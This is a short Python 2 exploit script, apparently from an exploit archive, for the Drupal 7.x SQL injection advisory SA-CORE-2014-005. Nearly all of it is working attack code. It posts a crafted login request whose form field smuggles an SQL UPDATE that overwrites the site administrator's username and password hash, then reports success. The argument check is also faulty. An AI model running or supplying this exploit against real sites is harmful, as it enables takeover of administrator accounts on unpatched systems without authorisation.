# Drupal 7.x SQL Injection SA-CORE-2014-005 https://www.drupal.org/SA-CORE-2014-005
# Creditz to https://www.reddit.com/user/fyukyuk
# EDB Note ~ Updated version: https://github.com/kenorb/drupageddon/blob/master/drupal_7.x_sql_injection_sa-core-2014-005.py

import urllib2,sys
from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py
host = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
if len(sys.argv) != 3:
    print "host username password"
    print "http://nope.io admin wowsecure"
hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash()
target = '%s/?q=node&destination=node' % host
post_data = "name[0%20;update+users+set+name%3d\'" \
            +user \
            +"'+,+pass+%3d+'" \
            +hash[:55] \
            +"'+where+uid+%3d+\'1\';;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
content = urllib2.urlopen(url=target, data=post_data).read()
if "mb_strlen() expects parameter 1" in content:
        print "Success!\nLogin now with user:%s and pass:%s" % (user, password)